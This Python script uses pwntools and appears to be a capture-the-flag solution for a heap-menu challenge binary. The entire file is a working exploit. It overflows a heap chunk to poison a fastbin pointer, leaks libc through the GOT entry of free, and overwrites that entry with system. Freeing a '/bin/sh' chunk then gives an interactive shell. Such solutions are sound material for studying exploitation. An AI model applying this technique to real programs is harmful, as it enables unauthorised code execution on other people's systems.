#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
context.log_level = "critical"
context.binary = "./pwn"
elf = context.binary
libc = elf.libc
#  libc = ELF("./libc-2.23.so", checksec = False)
libc.sym["one_gadget"] = 0x45216

def show():
    io.sendlineafter("choice:", "1")

def add(length, name):
    io.sendlineafter("choice:", "2")
    io.sendlineafter(":", str(length))
    io.sendafter(":", name)
    sleep(0.01)

def edit(idx, length, name):
    io.sendlineafter("choice:", "3")
    io.sendlineafter(":", str(idx))
    io.sendlineafter(":", str(length))
    io.sendafter(":", name)
    sleep(0.01)

def delete(idx):
    io.sendlineafter("choice:", "4")
    io.sendlineafter(":", str(idx))

def quit():
    io.sendlineafter("choice:", "5")


def DEBUG():
    pause()

io = process("./pwn")

add(0x10, '0' * 0x10)
add(0x10, '1' * 0x10)
add(0x21, '2' * 0x10 + '\n')
add(0x10, "/bin/sh\0")

delete(1)

edit(0, 0x80, flat('4' * 0x10, 0, 0x21, 0x6020e0 - 8))

add(0x10, '5' * 0x10)
add(0x10, flat(elf.got["free"]))

show()
libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - libc.sym["free"]
print("libc @ {:#x}".format(libc.address))

#  DEBUG()
edit(2, 0x20, flat(libc.sym["system"])[: 6])
delete(3)

io.interactive()
